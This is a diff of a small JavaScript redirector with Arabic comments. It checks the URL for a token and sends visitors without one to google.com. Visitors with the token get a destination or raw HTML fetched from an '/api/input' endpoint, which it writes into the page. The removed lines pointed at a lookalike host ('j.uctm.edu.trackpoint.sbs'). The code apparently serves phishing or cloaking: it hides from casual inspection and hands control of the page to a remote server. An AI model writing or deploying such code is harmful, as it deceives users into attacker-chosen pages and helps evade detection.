@@ -1,31 +1,32 @@
 (function() {
-    // استخراج قيمة المعامل ids أو io0 من الرابط الحالي
     var params = new URLSearchParams(window.location.search);
-    var paramValue = params.get("ids") || params.get("io0");
+    var paramValue = params.get("io0");
 
     if (!paramValue) {
         window.location.replace("https://www.google.com");
         return;
     }
 
-    // توجيه الطلب حصرياً وبشكل مطلق نحو نطاقك الفرعي المحدد
-    var targetUrl = "https://j.uctm.edu.trackpoint.sbs/api/input?ids=" + encodeURIComponent(paramValue);
+    // استخدام النطاق الحالي تلقائياً لتجنب مشاكل ERR_NAME_NOT_RESOLVED
+    var targetUrl = window.location.origin + "/api/input?ids=" + encodeURIComponent(paramValue);
 
-    fetch(targetUrl, {
-        method: 'GET',
-        headers: {
-            'Accept': 'application/json'
-        }
-    })
-    .then(function(res) {
-        return res.json();
-    })
-    .then(function(data) {
-        if (data && data.redirectUrl) {
-            window.location.replace(data.redirectUrl);
-        }
-    })
-    .catch(function(err) {
-        console.error("Execution error:", err);
-    });
+    fetch(targetUrl)
+        .then(function(res) {
+            return res.text();
+        })
+        .then(function(text) {
+            try {
+                var data = JSON.parse(text);
+                if (data.redirectUrl) {
+                    window.location.replace(data.redirectUrl);
+                }
+            } catch (err) {
+                document.open();
+                document.write(text);
+                document.close();
+            }
+        })
+        .catch(function(err) {
+            console.error("Execution error:", err);
+        });
 })();
